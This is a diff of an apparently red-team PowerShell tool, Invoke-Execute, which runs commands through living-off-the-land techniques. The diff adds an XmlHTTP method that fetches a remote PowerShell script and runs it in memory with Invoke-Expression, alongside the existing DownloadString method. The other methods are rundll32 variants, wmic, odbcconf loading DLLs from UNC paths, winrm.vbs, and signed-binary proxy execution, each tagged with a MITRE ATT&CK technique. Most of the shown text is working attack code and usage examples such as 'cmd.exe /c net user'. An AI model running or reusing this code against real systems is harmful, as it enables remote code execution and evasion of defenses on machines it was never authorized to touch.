@@ -1,59 +1,113 @@
+function Invoke-Execute {
 <#
-               
+                                          
 .SYNOPSIS
+	Execute commands on a target system using a number of different "living-off-the-land" techniques.
 
-Execute payloads on a target system using a number of different techniques. Each technique includes a Mitre ATT&CK Reference.
+.PARAMETER Help
+	Shows detailed help for each function.
+
+.PARAMETER List
+	Shows summary list of available functions.
+	
+.PARAMETER DownloadString
+	Executes a remote powershell script in memory using Net.WebClient DownloadString Method.
+	
+.PARAMETER XmlHTTP
+	Executes a remote powershell script in memory using Msxml2.XMLHTTP COM Object.
+	
+.PARAMETER Rundll
+	Executes a local DLL/EXE (or command) using rundll32 with a number of different methods.
+
+.PARAMETER WmicExec
+	Executes a local command via "wmic process call create".
+
+.PARAMETER WmicXSL
+	Utilizes wmic process get brief to execute a built-in XSL file containing a JScript ActiveXObject command.
+
+.PARAMETER OdbcExec
+	Uses odbcconf.exe to execute a local DLL or DLL at a UNC path.
+
+.PARAMETER WinRmWmi
+	Executes a command from a built-in XML file via winrm.vbs.
+
+.PARAMETER SignedProxyDll
+	Executes a DLL via an existing signed binary.
+
+.PARAMETER SignedProxyExe
+	Executes an EXE via an existing signed binary.
+	
+.EXAMPLE
+	Invoke-Execute -RunDll -Method 1 -File C:\temp\File.dll         
+	Invoke-Execute -RunDll -Method 5 -File 'cmd.exe /c net user....'
+
+       Available RunDLL Methods:                                              
+
+        [1] shell32.dll,Control_RunDLL   (DLL or CPL)
+        [2] shell32.dll,Control_RunDLLA  (DLL or CPL)
+        [3] IEAdvpack.dll,RegisterOCX    (DLL or EXE or COMMAND)
+        [4] zipfldr.dll,RouteTheCall     (EXE)
+        [5] advpack.dll,RegisterOCX      (DLL or EXE or COMMAND)
+        [6] pcwutl.dll,LaunchApplication (EXE)
 
 .EXAMPLE
-
-PS> Invoke-Execute -Help
-
-PS> Invoke-Execute -List
-
-PS> Invoke-Execute -RunDLL -Method 1 -File 'C:\temp\file.dll'
+	Invoke-Execute -OdbcExec -Dll \\server\share\File.dll
+	
+.EXAMPLE
+	Invoke-Execute -WinRmWmi -Command "cmd.exe /c net user...."
+	
+.EXAMPLE 
+	Invoke-Execute -SignedProxyExe -Method 1 -Exe C:\temp\file.exe
+	
+.EXAMPLE
+	Invoke-Execute -XmlHTTP -PsUrl http://192.168.1.1/script.ps1
+	
+.NOTES
+	Author: Fabrizio Siciliano (@0rbz_)
 
 #>
 
-function Invoke-Execute {
 [CmdletBinding()]
 param (
-	[Parameter(ParameterSetName = 'help', Position=1)]
+	[Parameter(Position=1)]
 	[Switch]$Help,
-	
-	[Parameter(ParameterSetName = 'listcommands', Position=1)]
 	[Switch]$List,
 	
-	[Parameter(ParameterSetName = 'downloadstring', Position=1)]
+	[Parameter(Mandatory = $False)]
 	[Switch]$DownloadString,
-	[String]$Psurl,
+	[String]$PsUrl,
 	
-	[Parameter(ParameterSetName = 'rundll', Position=1)]
+	[Parameter(Mandatory = $False)]
+	[Switch]$XmlHTTP,
+	[String]$PsUrl2=[String]$PsUrl,
+	
+	[Parameter(Mandatory = $False)]
 	[Switch]$Rundll,
 	[String]$Method,
 	[string]$File,
 	
-	[Parameter(ParameterSetName = 'WmicExec', Position=1)]
+	[Parameter(Mandatory = $False)]
 	[Switch]$WmicExec,
 	[string]$Command,
 	
-	[Parameter(ParameterSetName = 'WmicXSL', Position=1)]
+	[Parameter(Mandatory = $False)]
 	[Switch]$WmicXSL,
 	[string]$command2=[string]$command,
 	
-	[Parameter(ParameterSetName = 'OdbcExec', Position=1)]
+	[Parameter(Mandatory = $False)]
 	[Switch]$OdbcExec,
 	[string]$Dll,
 	
-	[Parameter(ParameterSetName = 'WinrmWmi', Position=1)]
+	[Parameter(Mandatory = $False)]
 	[Switch]$WinRmWmi,
 	[string]$Command3=[string]$Command,
 	
-	[Parameter(ParameterSetName = 'SignedProxyDll', Position=1)]
+	[Parameter(Mandatory = $False)]
 	[Switch]$SignedProxyDll,
 	[String]$Method2=[String]$Method,
 	[String]$Dll2=[string]$Dll,
 	
-	[Parameter(ParameterSetName = 'SignedProxyExe', Position=1)]
+	[Parameter(Mandatory = $False)]
 	[Switch]$SignedProxyExe,
 	[String]$Method3=[String]$Method,
 	[String]$Exe
@@ -110,137 +164,127 @@ $Rs4 = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
 		
 		Write @"
  
- ### Invoke-Execute HELP ###
+ ### Invoke-Execute Help ###
  ---------------------------
- 
- Invoke-Execute -Help
- 
- Quick Command Reference: Invoke-Execute -List
- 
  Available Invoke-Execute Commands:
  ----------------------------------
- /----------------------------------------------------------------------------/
+ |----------------------------------------------------------------------------|
  | -DownloadString [-PsUrl] url                                               |
- | --------------------------------------------------------------------       |
- |                                                                            |
- |  [*] Description: Executes a remote powershell script in memory            |
- |      using Net.WebClient DownloadString Method.                            |
- |                                                                            |
- |  [*] Mitre ATT&CK Ref: T1086 (PowerShell)                                  | 
- |      (https://attack.mitre.org/techniques/T1086/)                          |
- |                                                                            |
- |  [*] Usage: Invoke-Execute -DownloadString -psUrl http://server/script.ps1 |
- /----------------------------------------------------------------------------/
-	   	   
- /-----------------------------------------------------------------------------/
- | -RunDLL [-Method] num [-File] path_to_dll                                   |
- | --------------------------------------------------------------------------  |
- |                                                                             |
- |  [*] Description: Executes a local DLL/EXE (or command) using               |
- |      rundll32 with a number of different methods.                           |
- |                                                                             |
- |  [*] Mitre ATT&CK Ref: T1085 (Rundll32)                                     |
- |      (https://attack.mitre.org/techniques/T1085/)                           |
- |                                                                             |
- |  [*] Usage: Invoke-Execute -RunDll -Method 1 -File C:\temp\File.dll         |
- |  [*] Usage: Invoke-Execute -RunDll -Method 5 -File 'cmd.exe /c net user....'|
- |                                                                             |
- |      Available RunDLL Methods:                                              |
- |                                                                             |
- |      [1] shell32.dll,Control_RunDLL   (DLL or CPL)                          |
- |      [2] shell32.dll,Control_RunDLLA  (DLL or CPL)                          |
- |      [3] IEAdvpack.dll,RegisterOCX    (DLL or EXE or COMMAND)               |
- |      [4] zipfldr.dll,RouteTheCall     (EXE)                                 |
- |      [5] advpack.dll,RegisterOCX      (DLL or EXE or COMMAND)               |
- |      [6] pcwutl.dll,LaunchApplication (EXE)                                 |
- /-----------------------------------------------------------------------------/
-	
- /-----------------------------------------------------------------------------/
- | -WmicExec [-Command] "cmd.exe /c net user..."                               |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- |  [*] Description: Executes a local command via wmic process call            |
- |      create.                                                                |
- |                                                                             |
- |  [*] Mitre ATT&CK Ref: T1047 (Windows Management Instrumentation)           |
- |      (https://attack.mitre.org/techniques/T1047/)                           |
- |                                                                             |
- |  [*] Usage: Invoke-Execute -WmicExec -Command "cmd.exe /c net user..."      |
- /-----------------------------------------------------------------------------/
-		
- /-----------------------------------------------------------------------------/
- | -WmicXsl [-Command] "cmd.exe /c net user..."                                |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- |  [*] Description: Utilizes wmic process get brief to execute an XSL         |
- |      file containing JScript ActiveXObject command.                         |
- |                                                                             | 
- |  [*] Mitre ATT&CK Ref: T1220 (XSL Script Processing)                        |
- |      (https://attack.mitre.org/techniques/T1220/)                           |
- |                                                                             |
- |  [*] Usage: Invoke-Execute -WmicXsl -Command "cmd.exe /c net user..."       |
- /-----------------------------------------------------------------------------/
-		
- /-----------------------------------------------------------------------------/
- | -OdbcExec [-Dll] path_to_dll                                                |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- |  [*] Description: Uses odbcconf.exe to execute a local DLL or DLL           |
- |      at a UNC path.                                                         |
- |                                                                             |
- |  [*] Mitre ATT&CK Ref: T1085 (Rundll32)                                     |
- |      (https://attack.mitre.org/techniques/T1085/)                           |
- |                                                                             |
- |  [*] Usage: Invoke-Execute -OdbcExec -Dll \\server\share\File.dll           |
- |  [*] Usage: Invoke-Execute -OdbcExec -Dll C:\temp\File.dll                  |
- /-----------------------------------------------------------------------------/
-		
- /-----------------------------------------------------------------------------/
- | -WinRmWmi [-Command] "cmd /c net user ..."                                  |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- |  [*] Description: Executes a command from an XML file                       |
- |      via winrm.vbs.                                                         |
- |                                                                             |
- |  [*] Mitre ATT&CK Ref: T1028 (Windows Remote Management)                    | 
- |      (https://attack.mitre.org/techniques/T1028/)                           |
- |                                                                             |
- |  [*] Usage: Invoke-Execute -WinRmWmi -Command cmd.exe                       |
- |  [*] Usage: Invoke-Execute -WinRmWmi -Command "cmd.exe /c net user...."     |
- |                                                                             |
- /-----------------------------------------------------------------------------/
+ |----------------------------------------------------------------------------|
 
- /-----------------------------------------------------------------------------/
- | -SignedProxyDll [-Method] num [-Dll] file.dll                               |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- | [*] Description: Executes a DLL via an existing signed binary.              |
- |                                                                             |
- | [*] Mitre ATT&CK Ref: T1218 (Signed Binary Proxy Execution)                 |
- |     (https://attack.mitre.org/techniques/T1218/)                            |
- |                                                                             |
- | [*] Usage: Invoke-Execute -SignedProxyDll -Method 1 -Dll C:\temp\file.dll   |
- |                                                                             |
- |      Available SignedProxyDll Methods:                                      |
- |                                                                             |
- |      [1] AdobeARM.exe                                                       |
- /-----------------------------------------------------------------------------/
+   [*] Description: Executes a remote powershell script in memory
+       using Net.WebClient DownloadString Method.
+
+   [*] Usage: Invoke-Execute -DownloadString -PsUrl http://server/script.ps1 
+   
+   [*] Mitre ATT&CK Ref: T1086 (PowerShell)
+   
+ |----------------------------------------------------------------------------|
+ | -XmlHTTP [-PsUrl] url                                                      |
+ |----------------------------------------------------------------------------|
+
+   [*] Description: Executes a remote powershell script in memory using 
+       Msxml2.XMLHTTP COM Object.
+
+   [*] Usage: Invoke-Execute -XmlHTTP -PsUrl http://server/script.ps1 
+   
+   [*] Mitre ATT&CK Ref: T1086 (PowerShell)
+	   	   
+ |----------------------------------------------------------------------------|
+ | -RunDLL [-Method] num [-File] path_to_dll                                  |
+ |----------------------------------------------------------------------------|
+
+   [*] Description: Executes a local DLL/EXE (or command) using               
+       rundll32 with a number of different methods.                         
+
+   [*] Usage: Invoke-Execute -RunDll -Method 1 -File C:\temp\File.dll         
+   [*] Usage: Invoke-Execute -RunDll -Method 5 -File 'cmd.exe /c net user....'
+
+       Available RunDLL Methods:                                              
+
+        [1] shell32.dll,Control_RunDLL   (DLL or CPL)
+        [2] shell32.dll,Control_RunDLLA  (DLL or CPL)
+        [3] IEAdvpack.dll,RegisterOCX    (DLL or EXE or COMMAND)
+        [4] zipfldr.dll,RouteTheCall     (EXE)
+        [5] advpack.dll,RegisterOCX      (DLL or EXE or COMMAND)
+        [6] pcwutl.dll,LaunchApplication (EXE)
+
+   [*] Mitre ATT&CK Ref: T1085 (Rundll32)    	   
+ 	
+ |----------------------------------------------------------------------------|
+ | -WmicExec [-Command] "cmd.exe /c net user..."                              |
+ |----------------------------------------------------------------------------|
+
+   [*] Description: Executes a local command via wmic process call            
+       create.
+
+   [*] Usage: Invoke-Execute -WmicExec -Command "cmd.exe /c net user..."
+   
+   [*] Mitre ATT&CK Ref: T1047 (Windows Management Instrumentation)
+
+ |----------------------------------------------------------------------------|
+ | -WmicXsl [-Command] "cmd.exe /c net user..."                               |
+ |----------------------------------------------------------------------------|
+
+   [*] Description: Utilizes wmic process get brief to execute a built-in XSL 
+      file containing a JScript ActiveXObject command.
+
+   [*] Usage: Invoke-Execute -WmicXsl -Command "cmd.exe /c net user..."
+   
+   [*] Mitre ATT&CK Ref: T1220 (XSL Script Processing)
+
+ |----------------------------------------------------------------------------|
+ | -OdbcExec [-Dll] path_to_dll                                               |
+ |----------------------------------------------------------------------------|
+
+   [*] Description: Uses odbcconf.exe to execute a local DLL or DLL           
+       at a UNC path.
+
+   [*] Usage: Invoke-Execute -OdbcExec -Dll \\server\share\File.dll
+   [*] Usage: Invoke-Execute -OdbcExec -Dll C:\temp\File.dll
+   
+   [*] Mitre ATT&CK Ref: T1085 (Rundll32)
+
+ |----------------------------------------------------------------------------|
+ | -WinRmWmi [-Command] "cmd /c net user ..."                                 |
+ |----------------------------------------------------------------------------|
+
+   [*] Description: Executes a command from a built-in XML file via winrm.vbs.
+
+   [*] Usage: Invoke-Execute -WinRmWmi -Command cmd.exe
+   [*] Usage: Invoke-Execute -WinRmWmi -Command "cmd.exe /c net user...."
+   
+   [*] Mitre ATT&CK Ref: T1028 (Windows Remote Management)
  
- /-----------------------------------------------------------------------------/
- | -SignedProxyExe [-Method] num [-Exe] file.exe                               |
- | --------------------------------------------------------------------------- |
- |                                                                             |
- | [*] Description: Executes an EXE via an existing signed binary.             |
- |                                                                             |
- | [*] Mitre ATT&CK Ref: T1218 (Signed Binary Proxy Execution)                 |
- |     (https://attack.mitre.org/techniques/T1218/)                            |
- |                                                                             |
- | [*] Usage: Invoke-Execute -SignedProxyExe -Method 1 -Exe C:\temp\file.exe   |
- |                                                                             |
- |     Available SignedProxyExe Methods:                                       |
- |                                                                             |
- |      [1] pcalua.exe                                                         |
- /-----------------------------------------------------------------------------/
+ |----------------------------------------------------------------------------|
+ | -SignedProxyDll [-Method] num [-Dll] file.dll                              |
+ |----------------------------------------------------------------------------|
+
+   [*] Description: Executes a DLL via an existing signed binary.
+
+   [*] Usage: Invoke-Execute -SignedProxyDll -Method 1 -Dll C:\temp\file.dll
+
+       Available SignedProxyDll Methods
+
+        [1] AdobeARM.exe
+	   
+   [*] Mitre ATT&CK Ref: T1218 (Signed Binary Proxy Execution)
+
+ |----------------------------------------------------------------------------|
+ | -SignedProxyExe [-Method] num [-Exe] file.exe                              |
+ |----------------------------------------------------------------------------|
+
+   [*] Description: Executes an EXE via an existing signed binary.
+
+   [*] Usage: Invoke-Execute -SignedProxyExe -Method 1 -Exe C:\temp\file.exe
+
+       Available SignedProxyExe Methods:
+
+        [1] pcalua.exe
+		
+   [*] Mitre ATT&CK Ref: T1218 (Signed Binary Proxy Execution)
+		
+ \-----------------------------------------------------------------------------/
  
 "@
 	}
@@ -248,36 +292,57 @@ $Rs4 = (-join ((65..90) + (97..122) | Get-Random -Count 5 | foreach {[char]$_}))
 	elseif ($List -eq $True) {
 		Write @"  
 
- Invoke-Execute Command List:
- ----------------------------
- Invoke-Execute -DownloadString [-PsUrl] url
- Invoke-Execute -RunDLL [-Method] num [-File] 'path_to_dll' or 'path_to_exe'
- Invoke-Execute -WmicExec [-Command] "cmd"
- Invoke-Execute -WmicXsl [-Command] "cmd"
- Invoke-Execute -OdbcExec [-Dll] path_to_dll
- Invoke-Execute -WinRmWmi [-Command] "cmd"
- Invoke-Execute -SignedProxyDll [-Method] num [-Dll] path_to_dll
- Invoke-Execute -SignedProxyExe [-Method] num [-Exe] path_to_exe
+ Invoke-Execute Brief Command Usage:
+ -----------------------------------
+ Invoke-Execute -DownloadString -PsUrl http://server/script.ps1
+ Invoke-Execute -XmlHTTP -PsUrl http://server/script.ps1
+ Invoke-Execute -RunDll -Method 1,2,3,4,5,6 -File 'cmd.exe /c net user....'
+ Invoke-Execute -WmicExec -Command "cmd.exe /c net user..."
+ Invoke-Execute -WmicXsl -Command "cmd.exe /c net user..."
+ Invoke-Execute -OdbcExec -Dll \\server\share\File.dll
+ Invoke-Execute -WinRmWmi -Command "cmd.exe /c net user...."
+ Invoke-Execute -SignedProxyDll -Method 1 -Dll C:\temp\file.dll
+ Invoke-Execute -SignedProxyExe -Method 1 -Exe C:\temp\file.exe
 
 "@
 	}
 
 	elseif ($DownloadString -and $PsUrl) {
-	
+		if ($PSVersionTable.PSVersion.Major -eq "2") {
+			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
+			return
+		}
 		$h = "`n### Invoke-Execute(DownloadString) ###`n"
 		Try {
-			(Invoke-Expression (New-Object Net.Webclient).Downloadstring($psurl))
+			(Invoke-Expression (New-Object Net.Webclient).Downloadstring($PsUrl))
 			$h
 			Write " [+] Executed the following powershell script in memory: $PsUrl"
 			$h
 		}
 		Catch {
 			$h
-			Write "[!] Error. Check the remote file exists."
+			Write "`n [!] Unknown Error.`n"
 			$h
 		}
-	}	
-	
+	}
+	elseif ($XmlHTTP -and $PsUrl) {
+	# https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+		$h = "`n### Invoke-Execute(XmlHTTP) ###`n"
+		Try {
+			$Dl = (New-Object -ComObject Msxml2.XMLHTTP)
+			$Dl.open('GET',"$PsUrl",$false)
+			$Dl.send()
+			Invoke-Expression $Dl.responseText
+			$h 
+			Write " [+] Executed the following powershell script in memory: $PsUrl"
+			$h
+		}
+		Catch {
+			$h
+			Write "`n [!] Unknown Error.`n"
+			$h
+		}
+	}
 	elseif ($RunDll -and $Method -eq 1 -and $File) {
 	# https://www.thewindowsclub.com/rundll32-shortcut-commands-windows
 	# https://twitter.com/mattifestation/status/776574940128485376
@@ -460,7 +525,6 @@ version="1.0">
 	elseif ($SignedProxyExe -and $Method -eq 1 -and $Exe) {
 		$h = "`n### Invoke-Execute(SignedPivotExe) ###`n"
 		$PcaluaExists = (Test-Path C:\??*?\*3?\p?al*?.?x?)
-		
 		if ($PcaluaExists) {
 		# https://twitter.com/0rbz_/status/912530504871759872
 		# https://twitter.com/kylehanslovan/status/912659279806640128
